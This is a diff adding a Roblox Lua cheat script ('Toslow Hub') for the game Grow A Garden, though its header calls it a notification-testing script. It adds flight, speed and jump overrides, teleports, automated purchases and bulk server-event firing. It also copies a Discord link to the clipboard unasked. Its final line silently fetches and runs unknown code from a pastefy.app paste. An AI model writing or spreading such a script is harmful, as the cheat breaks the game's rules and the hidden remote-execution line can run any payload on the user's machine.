@@ -1,0 +1,736 @@
+-- This is a single LocalScript for managing and testing notifications.
+-- All Roblox services and UI elements are defined at the top for easy access.
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Debris = game:GetService("Debris")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local NotificationFrame = PlayerGui:WaitForChild("Top_Notification"):WaitForChild("Frame")
+local NotificationSound = SoundService.Notification
+local NotificationUI = ReplicatedStorage.Notification_UI
+local NotificationUIMobile = ReplicatedStorage.Notification_UI_Mobile
+
+-- The main Discord link variable, making it easy to update.
+local discordlink = "https://discord.gg/QXdGxfgxdm"
+
+-- Load the Fluent library and its addons
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+-- Create the main window and tabs for the UI
+local Window = Fluent:CreateWindow({
+	Title = "Toslow Hub",
+	SubTitle = "by toslow",
+	TabWidth = 160,
+	Size = UDim2.fromOffset(580, 460),
+	Acrylic = false,
+	Theme = "Aqua",
+	MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+local Tabs = {
+	Main = Window:AddTab({ Title = "Main", Icon = "droplet" }),
+	Event = Window:AddTab({ Title = "Event", Icon = "flag" }),
+	Crafting = Window:AddTab({ Title = "Crafting", Icon = "sprout" }),
+	Autobuy = Window:AddTab({ Title = "Autobuy", Icon = "dollar-sign" }),
+	Farming = Window:AddTab({ Title = "Farming", Icon = "apple" }),
+	Misc = Window:AddTab({ Title = "Misc", Icon = "plus" }),
+	Beta = Window:AddTab({ Title = "BETA", Icon = "flag" }),
+	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+
+local Options = Fluent.Options
+
+-- Fly script variables and logic
+local FLYING = false
+local allowVerticalKeys = true
+local flySpeed = 10 -- Initial default speed, now set to 10
+local control = {F = 0, B = 0, L = 0, R = 0, Up = 0, Down = 0}
+local speed = 0
+
+local keyDownConn, keyUpConn
+local function getRoot(char)
+	return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function startFly()
+	repeat task.wait() until LocalPlayer.Character and getRoot(LocalPlayer.Character) and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+	if keyDownConn then keyDownConn:Disconnect() end
+	if keyUpConn then keyUpConn:Disconnect() end
+
+	local rootPart = getRoot(LocalPlayer.Character)
+	local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+
+	-- Force idle animation
+	if humanoid then
+		humanoid.PlatformStand = true
+	end
+
+	local gyro = Instance.new("BodyGyro")
+	local velocity = Instance.new("BodyVelocity")
+
+	gyro.P = 9e4
+	gyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+	gyro.CFrame = rootPart.CFrame
+	gyro.Parent = rootPart
+
+	velocity.Velocity = Vector3.new()
+	velocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+	velocity.Parent = rootPart
+
+	FLYING = true
+
+	keyDownConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then return end
+		local key = input.KeyCode.Name:lower()
+		if key == "w" then
+			control.F = flySpeed
+		elseif key == "s" then
+			control.B = -flySpeed
+		elseif key == "a" then
+			control.L = -flySpeed
+		elseif key == "d" then
+			control.R = flySpeed
+		elseif allowVerticalKeys and key == "e" then
+			control.Up = flySpeed * 2
+		elseif allowVerticalKeys and key == "q" then
+			control.Down = -flySpeed * 2
+		end
+	end)
+
+	keyUpConn = UserInputService.InputEnded:Connect(function(input, gameProcessed)
+		if gameProcessed then return end
+		local key = input.KeyCode.Name:lower()
+		if key == "w" then control.F = 0
+		elseif key == "s" then control.B = 0
+		elseif key == "a" then control.L = 0
+		elseif key == "d" then control.R = 0
+		elseif key == "e" then control.Up = 0
+		elseif key == "q" then control.Down = 0
+		end
+	end)
+
+	task.spawn(function()
+		while FLYING and rootPart and rootPart.Parent do
+			task.wait()
+			local camCF = workspace.CurrentCamera.CFrame
+
+			-- Extract yaw and pitch from camera, lock roll to 0
+			local camLook = camCF.LookVector
+			local flatCF = CFrame.new(Vector3.new(), Vector3.new(camLook.X, 0, camLook.Z))
+			local pitch = math.asin(camLook.Y)
+			local lockedCF = flatCF * CFrame.Angles(pitch, 0, 0)
+
+			local moveDir = Vector3.new()
+			if control.F ~= 0 or control.B ~= 0 or control.L ~= 0 or control.R ~= 0 or control.Up ~= 0 or control.Down ~= 0 then
+				moveDir = ((camCF.LookVector * (control.F + control.B))
+					+ ((camCF * CFrame.new(control.L + control.R, (control.F + control.B + control.Up + control.Down) * 0.2, 0).Position) - camCF.Position))
+				speed = flySpeed
+			else
+				speed = 0
+			end
+
+			velocity.Velocity = moveDir * speed
+			gyro.CFrame = lockedCF
+		end
+
+		-- Reset
+		control = {F = 0, B = 0, L = 0, R = 0, Up = 0, Down = 0}
+		speed = 0
+		if gyro and gyro.Parent then gyro:Destroy() end
+		if velocity and velocity.Parent then velocity:Destroy() end
+		if humanoid and humanoid.PlatformStand then
+			humanoid.PlatformStand = false
+		end
+	end)
+end
+
+local function stopFly()
+	FLYING = false
+	if keyDownConn then keyDownConn:Disconnect() end
+	if keyUpConn then keyUpConn:Disconnect() end
+	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+		LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
+	end
+end
+
+-- Function to apply walk speed and jump height settings to the character
+local function applyCharacterSettings(character)
+	if character and character:FindFirstChildOfClass("Humanoid") then
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		-- Apply walk speed from the input
+		local newWalkSpeed = tonumber(Options.WalkSpeed.Value)
+		if newWalkSpeed then
+			humanoid.WalkSpeed = newWalkSpeed
+		end
+		-- Apply jump height from the input
+		local newJumpHeight = tonumber(Options.JumpHeight.Value)
+		if newJumpHeight then
+			humanoid.JumpPower = newJumpHeight
+		end
+	end
+end
+
+-- Listen for the character to spawn or respawn and apply the settings
+LocalPlayer.CharacterAdded:Connect(function(character)
+	task.wait(0.5) -- Wait a moment to ensure the Humanoid is fully loaded
+	applyCharacterSettings(character)
+end)
+
+-- UI and event handler setup
+do
+	-- Initial notification to the user
+	Fluent:Notify({
+		Title = "Thank you for using my script",
+		Content = "Make sure to join the discord server!",
+		SubContent = "-toslow",
+		Duration = 5
+	})
+
+	-- Main tab content
+	Tabs.Main:AddParagraph({
+		Title = "Info",
+		Content = "This is the Toslow Grow A Garden Script!\n Join the discord to enter giveaways, update info, and more!"
+	})
+
+	Tabs.Main:AddButton({
+		Title = "Discord Link",
+		Description = discordlink,
+		Callback = function()
+			setclipboard(discordlink)
+		end
+	})
+
+	-- Teleport UI Toggle
+	local petsFrame = PlayerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Pets")
+	local gearFrame = PlayerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Gear")
+
+	local TeleportToggle = Tabs.Main:AddToggle("TeleportToggle", {
+		Title = "Show Gear-Pets teleport",
+		Default = true,
+		Callback = function(Value)
+			petsFrame.Visible = Value
+			gearFrame.Visible = Value
+		end
+	})
+
+	TeleportToggle:OnChanged(function(Value)
+		petsFrame.Visible = Value
+		gearFrame.Visible = Value
+	end)
+
+	-- Fly Features Section
+	Tabs.Main:AddParagraph({
+		Title = "Movement Settings",
+		Content = ""
+	})
+
+	-- Input for Walk Speed
+	local walkSpeedInput = Tabs.Main:AddInput("WalkSpeed", {
+		Title = "Walk Speed",
+		Default = tostring(20),
+		Placeholder = "Enter a number",
+		Numeric = true,
+		Finished = false,
+		Callback = function(text)
+			local newSpeed = tonumber(text)
+			if newSpeed then
+				local character = LocalPlayer.Character
+				if character and character:FindFirstChildOfClass("Humanoid") then
+					character.Humanoid.WalkSpeed = newSpeed
+				end
+			end
+		end
+	})
+
+	-- Input for Jump Height
+	local jumpHeightInput = Tabs.Main:AddInput("JumpHeight", {
+		Title = "Jump Height",
+		Default = tostring(50),
+		Placeholder = "Enter a number",
+		Numeric = true,
+		Finished = false,
+		Callback = function(text)
+			local newJumpPower = tonumber(text)
+			if newJumpPower then
+				local character = LocalPlayer.Character
+				if character and character:FindFirstChildOfClass("Humanoid") then
+					character.Humanoid.JumpPower = newJumpPower
+				end
+			end
+		end
+	})
+
+	local flyToggle = Tabs.Main:AddToggle("FlyToggle", {
+		Title = "Fly",
+		Description = "Toggles flight on or off.",
+		Default = false,
+		Callback = function(value)
+			if value then
+				startFly()
+			else
+				stopFly()
+			end
+		end
+	})
+
+	-- Fly Keybind using the correct method
+	local flyKeybind = Tabs.Main:AddKeybind("FlyKeybind", {
+		Title = "Fly Keybind",
+		Mode = "Toggle",
+		Default = "F",
+		-- The callback is triggered when the keybind is pressed and the mode is "Toggle"
+		Callback = function(isToggled)
+			if isToggled then
+				if not FLYING then
+					startFly()
+					Options.FlyToggle.Value = true
+				end
+			else
+				if FLYING then
+					stopFly()
+					Options.FlyToggle.Value = false
+				end
+			end
+		end,
+		-- The ChangedCallback is triggered when the keybind is changed in the UI
+		ChangedCallback = function(newKey)
+			print("Fly keybind changed to:", newKey.Name)
+		end
+	})
+
+	-- Input to set fly speed
+	local flySpeedInput = Tabs.Main:AddInput("FlySpeedInput", {
+		Title = "Fly Speed",
+		Default = tostring(flySpeed),
+		Placeholder = "Enter a number",
+		Numeric = true,
+		Finished = false,
+		Callback = function(text)
+			local newSpeed = tonumber(text)
+			if newSpeed then
+				flySpeed = newSpeed
+				-- If already flying, update the speed
+				if FLYING then
+					control.F = newSpeed
+					control.B = -newSpeed
+					control.L = -newSpeed
+					control.R = newSpeed
+					control.Up = newSpeed * 2
+					control.Down = -newSpeed * 2
+				end
+			end
+		end
+	})
+
+	-- EVENT TAB CONTENT
+	-- Beanstalk Event section
+	Tabs.Event:AddParagraph({
+		Title = "Beanstalk Event",
+		Content = ""
+	})
+	
+	-- Toggle for auto submitting inventory to the beanstalk
+	Tabs.Event:AddToggle("autoSubmitBeanstalk", {
+		Title = "Auto submit inventory to Jack (Beanstalk)",
+		Description = "Automatically submits inventory to Jack every second.",
+		Default = false,
+	})
+
+	-- Button to teleport to the giant
+	Tabs.Event:AddButton({
+		Title = "Teleport to Giant",
+		Description = "Teleports you to the giant in the clouds.",
+		Callback = function()
+			local character = LocalPlayer.Character
+			if character and character:FindFirstChild("HumanoidRootPart") then
+				character.HumanoidRootPart.CFrame = CFrame.new(-143.866699, 181.298508, -15.7860165)
+				print("Teleported to giant beanstalk.")
+			else
+				warn("Character or HumanoidRootPart not found!")
+			end
+		end
+	})
+	
+	-- Cooking Event section
+	Tabs.Event:AddParagraph({
+		Title = "Cooking Event",
+		Content = ""
+	})
+	
+	-- Toggle to manage the cooking event
+	Tabs.Event:AddToggle("ShowCookingEvent", {
+		Title = "Show cooking event",
+		Description = "Enables the cooking event from the previous update.",
+		Default = false,
+		Callback = function(value)
+			local eventHoldingFolder = ReplicatedStorage:FindFirstChild("eventholding")
+			if not eventHoldingFolder then
+				eventHoldingFolder = Instance.new("Folder")
+				eventHoldingFolder.Name = "eventholding"
+				eventHoldingFolder.Parent = ReplicatedStorage
+			end
+
+			local beanstalkEvent = workspace.Interaction.UpdateItems:FindFirstChild("BeanstalkEvent")
+			local updateService = ReplicatedStorage.Modules:FindFirstChild("UpdateService")
+			local updateServiceInWorkspace = workspace:FindFirstChild("UpdateService")
+
+			if value then
+				-- If the toggle is ON, move BeanstalkEvent and copy UpdateService
+				if beanstalkEvent then
+					-- Move BeanstalkEvent to the holding folder
+					beanstalkEvent.Parent = eventHoldingFolder
+					print("Moved BeanstalkEvent to ReplicatedStorage/eventholding")
+				end
+
+				if updateService and not updateServiceInWorkspace then
+					-- Clone UpdateService and place it in the workspace
+					local clonedUpdateService = updateService:Clone()
+					clonedUpdateService.Parent = workspace
+					print("Cloned and moved UpdateService to workspace")
+				end
+			else
+				-- If the toggle is OFF, reverse the process
+				if updateServiceInWorkspace then
+					-- Delete UpdateService from the workspace
+					updateServiceInWorkspace:Destroy()
+					print("Removed UpdateService from workspace")
+				end
+
+				if beanstalkEvent == nil and eventHoldingFolder:FindFirstChild("BeanstalkEvent") then
+					-- Move BeanstalkEvent back to its original location
+					eventHoldingFolder.BeanstalkEvent.Parent = workspace.Interaction.UpdateItems
+					print("Moved BeanstalkEvent back to its original location")
+				end
+			end
+		end
+	})
+
+	-- Button for submitting held food to Chris P.
+	Tabs.Event:AddButton({
+		Title = "Submit held food to Chris P.",
+		Description = "Submits the food you are holding to Chris P.",
+		Callback = function()
+			local args = {
+				"SubmitHeldFood"
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SubmitFoodService_RE"):FireServer(unpack(args))
+		end
+	})
+
+	-- Button for submitting held mutated food to Connoisseur
+	Tabs.Event:AddButton({
+		Title = "Submit held mutated food to Connoisseur",
+		Description = "Submits the mutated food you are holding to the Food Connoisseur.",
+		Callback = function()
+			local args = {
+				"SubmitHeldFood",
+				true
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SubmitFoodService_RE"):FireServer(unpack(args))
+		end
+	})
+	
+	-- CRAFTING TAB CONTENT
+	local SeedDropdown = Tabs.Crafting:AddDropdown("Dropdown", {
+		Title = "Seed Crafting Table",
+		Values = {"Crafters Seed Pack", "Peace Lily", "Aloe Vera", "Guanabana", "Manuka Flower", "Dandelion", "Lumira", "Honeysuckle", "Bee Balm", "Nectar Thorn", "Suncoil", "Horsetail"},
+		Multi = false,
+		Default = 1,
+	})
+	local GearDropdown = Tabs.Crafting:AddDropdown("GearCraftingDropdown", {
+		Title = "Gear Crafting Table",
+		Values = {"Lightning Rod", "Tanning Mirror", "Reclaimer", "Small Toy", "Small Treat", "Tropical Mist Sprinkler", "Berry Blusher Sprinkler", "Spice Spritzer Sprinkler", "Sweet Soaker Sprinkler", "Flower Froster Sprinkler", "Stalk Sprout Sprinkler", "Mutation Spray Choc", "Mutation Spray Chilled", "Mutation Spray Pollinated", "Mutation Spray Shocked", "Honey Crafters Crate", "Anti Bee Egg", "Pack Bee"},
+		Multi = false,
+		Default = 1,
+	})
+	SeedDropdown:SetValue("None")
+	SeedDropdown:OnChanged(function(selectedSeed)
+		local args = {
+			"SetRecipe",
+			workspace:WaitForChild("CraftingTables"):WaitForChild("SeedEventCraftingWorkBench"),
+			"SeedEventWorkbench",
+			selectedSeed
+		}
+		ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("CraftingGlobalObjectService"):FireServer(unpack(args))
+	end)
+	GearDropdown:SetValue("None")
+	GearDropdown:OnChanged(function(selectedGear)
+		local args = {
+			"SetRecipe",
+			workspace:WaitForChild("CraftingTables"):WaitForChild("EventCraftingWorkBench"),
+			"GearEventWorkbench",
+			selectedGear
+		}
+		ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("CraftingGlobalObjectService"):FireServer(unpack(args))
+	end)
+	Tabs.Crafting:AddParagraph({
+		Title = "Submit Pollinated Plants",
+		Content = "Convert your pollinated plants into honey."
+	})
+	Tabs.Crafting:AddButton({
+		Title = "Submit held",
+		Description = "Submits the pollinated plant you are currently holding.",
+		Callback = function()
+			local args = {
+				"HELD"
+			}
+			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMerchantSubmit_RE"):FireServer(unpack(args))
+		end
+	})
+	Tabs.Crafting:AddButton({
+		Title = "Submit All Plants",
+		Description = "WARNING: Converts all pollinated plants in your inventory.",
+		Callback = function()
+			Window:Dialog({
+				Title = "WARNING",
+				Content = "Continuing will convert all plants in your inventory with the pollinated mutation into honey, excluding favorited plants.",
+				Buttons = {
+					{
+						Title = "Continue",
+						Callback = function()
+							local args = {
+								"ALL"
+							}
+							ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMerchantSubmit_RE"):FireServer(unpack(args))
+						end
+					},
+					{
+						Title = "Close",
+						Callback = function()
+							-- Do nothing, the dialog will close
+						end
+					}
+				}
+			})
+		end
+	})
+
+	-- AUTOBUT TAB CONTENT
+	Tabs.Autobuy:AddParagraph({
+		Title = "Autobuy Settings",
+		Content = "Configure which items you want to automatically purchase from different shops."
+	})
+	local AutobuyDelaySlider = Tabs.Autobuy:AddSlider("AutobuyDelay", {
+		Title = "Autobuy Delay (seconds)",
+		Description = "The delay between attempts to buy all selected items.",
+		Default = 5,
+		Min = 0.1,
+		Max = 100,
+		Rounding = 2,
+	})
+	local SeedShopDropdown = Tabs.Autobuy:AddDropdown("SeedShopAutobuy", {
+		Title = "Seed Shop",
+		Values = {"Carrot", "Strawberry", "Blueberry", "Orange Tulip", "Tomato", "Corn", "Daffodil", "Watermelon", "Pumpkin", "Apple", "Bamboo", "Coconut", "Cactus", "Dragon Fruit", "Mango", "Grape", "Mushroom", "Pepper", "Cacao", "Beanstalk", "Ember Lily", "Sugar Apple", "Burning Bud", "Giant Pinecone", "Elder Strawberry"},
+		Multi = true,
+		Default = {},
+	})
+	local GearShopDropdown = Tabs.Autobuy:AddDropdown("GearShopAutobuy", {
+		Title = "Gear Shop",
+		Values = {"Watering Can", "Trading Ticket", "Trowel", "Recall Wrench", "Basic Sprinkler", "Advanced Sprinkler", "Medium Toy", "Medium Treat", "Godly Sprinkler", "Magnifying Glass", "Master Sprinkler", "Cleaning Spray", "Favorite Tool", "Harvest Tool", "Friendship Pot", "Grandmaster Sprinkler", "Levelup Lollipop"},
+		Multi = true,
+		Default = {},
+	})
+	local EggShopDropdown = Tabs.Autobuy:AddDropdown("EggShopAutobuy", {
+		Title = "Egg Shop",
+		Values = {"Common Egg", "Common Summer Egg", "Rare Summer Egg", "Mythical Egg", "Paradise Egg", "Bug Egg"},
+		Multi = true,
+		Default = {},
+	})
+	local CosmeticShopDropdown = Tabs.Autobuy:AddDropdown("CosmeticShopAutobuy", {
+		Title = "Cosmetic Shop",
+		Values = {"Coming soon!"},
+		Multi = true,
+		Default = {},
+	})
+	local AutobuyMasterToggle = Tabs.Autobuy:AddToggle("AutobuyMasterToggle", {
+		Title = "Enable Autobuy",
+		Default = false,
+	})
+
+	-- Refactored autobuy logic into a single function and loop
+	local function buyItems(shopName, remoteEventName, purchaseCount)
+		local selectedItems = Options[shopName].Value
+		if selectedItems and next(selectedItems) then
+			for itemName, isSelected in pairs(selectedItems) do
+				if isSelected then
+					for i = 1, purchaseCount do
+						local args = { itemName }
+						ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild(remoteEventName):FireServer(unpack(args))
+						task.wait(0.01)
+					end
+				end
+			end
+		end
+	end
+
+	task.spawn(function()
+		while Fluent.Unloaded == false do
+			if Options.AutobuyMasterToggle.Value then
+				buyItems("EggShopAutobuy", "BuyPetEgg", 3)
+				buyItems("SeedShopAutobuy", "BuySeedStock", 25)
+				buyItems("GearShopAutobuy", "BuyGearStock", 5)
+				-- You could add a call for the Cosmetic shop here once it's implemented.
+			end
+			task.wait(Options.AutobuyDelay.Value)
+		end
+	end)
+
+	-- FARMING TAB CONTENT
+	Tabs.Farming:AddParagraph({
+		Title = "This feature isn't done yet",
+		Content = "Coming soon!"
+	})
+
+
+	Tabs.Misc:AddButton({
+		Title = "Like All Gardens",
+		Description = "Goes through every player in the server and likes their garden.",
+		Callback = function()
+			local players = Players:GetPlayers()
+			local likeEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("LikeGarden")
+			
+			for _, player in ipairs(players) do
+				-- The code you provided uses InvokeServer, but FireServer is more typical for
+				-- actions that don't need a return value from the server immediately.
+				-- However, I've kept it as InvokeServer to match your original code.
+				likeEvent:InvokeServer(player)
+				task.wait(1)
+				print("Attempted to like " .. player.Name .. "'s garden.")
+			end
+			
+			Fluent:Notify({
+				Title = "Liked All Gardens",
+				Content = "Successfully liked garden for all players in the server.",
+				Duration = 5
+			})
+		end
+	})
+
+	Tabs.Misc:AddButton({
+		Title = "Claim All Redeemable Codes",
+		Description = "1x code available",
+		Callback = function()
+			local args = {
+				"ClaimCode",
+				"torigate"
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("ClaimableCodeService"):FireServer(unpack(args))
+			
+			Fluent:Notify({
+				Title = "Claimed code",
+				Content = "Attempted to claim code: torigate.",
+				Duration = 5
+			})
+		end
+	})
+end
+
+
+-- New task for the auto-submit beanstalk feature
+task.spawn(function()
+	while Fluent.Unloaded == false do
+		if Options.autoSubmitBeanstalk.Value then
+			local args = {}
+			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BeanstalkRESubmitAllPlant"):FireServer(unpack(args))
+			print("Auto-submitting inventory to beanstalk.")
+		end
+		task.wait(1)
+	end
+end)
+
+-- Notification system logic
+task.spawn(function()
+	while true do
+		for _, v6 in NotificationFrame:GetChildren() do
+			if v6:IsA("Frame") and (v6.Name == "Notification_UI" or v6.Name == "Notification_UI_Mobile") then
+				local v7 = v6:GetAttribute("NotificationTimer")
+				if v7 and type(v7) == "number" then
+					local v8 = v7 - 1
+					if v8 <= 0 then
+						v6:SetAttribute("NotificationTimer", nil)
+						local v9 = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+						local v10 = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+						local v11 = v6.TextLabel.Position
+						TweenService:Create(v6.TextLabel, v10, {["Position"] = v11 + UDim2.new(0, 0, 0.2, 0)}):Play()
+						TweenService:Create(v6.ImageLabel, v9, {["ImageTransparency"] = 1}):Play()
+						TweenService:Create(v6.TextLabel, v9, {["TextTransparency"] = 1}):Play()
+						TweenService:Create(v6.TextLabel, v9, {["TextStrokeTransparency"] = 1}):Play()
+						Debris:AddItem(v6, v9.Time)
+					else
+						v6:SetAttribute("NotificationTimer", v8)
+					end
+				end
+			end
+		end
+		task.wait(1)
+	end
+end)
+
+-- Function to create and show a notification
+local function createNotification(isMobile, message, forceNew, duration)
+	local v16 = duration or 3.5
+	local v17 = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	local v18 = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	local v19 = isMobile and NotificationUIMobile or NotificationUI
+	local v20 = nil
+
+	if not forceNew then
+		for _, v21 in ipairs(NotificationFrame:GetChildren()) do
+			if v21:IsA("Frame") and (v21.Name == "Notification_UI" or v21.Name == "Notification_UI_Mobile") and v21:GetAttribute("OG") == message then
+				v20 = v21
+				break
+			end
+		end
+	end
+
+	if v20 then
+		local v22 = v20:FindFirstChild("VAL_OBJ")
+		if v22 then
+			v22.Value = v22.Value + 1
+			v20.TextLabel.Text = message .. " [X" .. v22.Value .. "]"
+		end
+		v20:SetAttribute("NotificationTimer", v16)
+	else
+		local v23 = v19:Clone()
+		v23.TextLabel.Text = message
+		v23:SetAttribute("OG", message)
+		v23:SetAttribute("NotificationTimer", v16)
+
+		local v24 = Instance.new("IntValue")
+		v24.Name = "VAL_OBJ"
+		v24.Value = 1
+		v24.Parent = v23
+
+		local v25 = v23.TextLabel.Position
+		local v26 = v23.TextLabel
+		v26.Position = v26.Position - UDim2.new(0, 0, 0.2, 0)
+		v23.ImageLabel.ImageTransparency = 1
+		v23.TextLabel.TextTransparency = 1
+		v23.TextLabel.TextStrokeTransparency = 1
+		v23.Parent = NotificationFrame
+
+		TweenService:Create(v23.TextLabel, v18, {["Position"] = v25}):Play()
+		TweenService:Create(v23.ImageLabel, v17, {["ImageTransparency"] = 0.5}):Play()
+		TweenService:Create(v23.TextLabel, v17, {["TextTransparency"] = 0}):Play()
+		TweenService:Create(v23.TextLabel, v17, {["TextStrokeTransparency"] = 0}):Play()
+
+		NotificationSound.PlaybackSpeed = 1 + math.random(-15, 15) / 100
+		NotificationSound.Playing = true
+		NotificationSound.TimePosition = 0
+	end
+end
+
+-- Test notifications
+task.wait(2)
+createNotification(UserInputService.TouchEnabled, "Gui successfully loaded", false, 30)
+task.wait(0.25)
+createNotification(UserInputService.TouchEnabled, "Discord server link copied to clipboard!", false, 30)
+createNotification(UserInputService.TouchEnabled, "Warning: You may switch servers, this happens if a feature doesnt work", false, 30)
+setclipboard(discordlink)
+loadstring(game:HttpGet("https://pastefy.app/4dpJnBCL/raw"))()
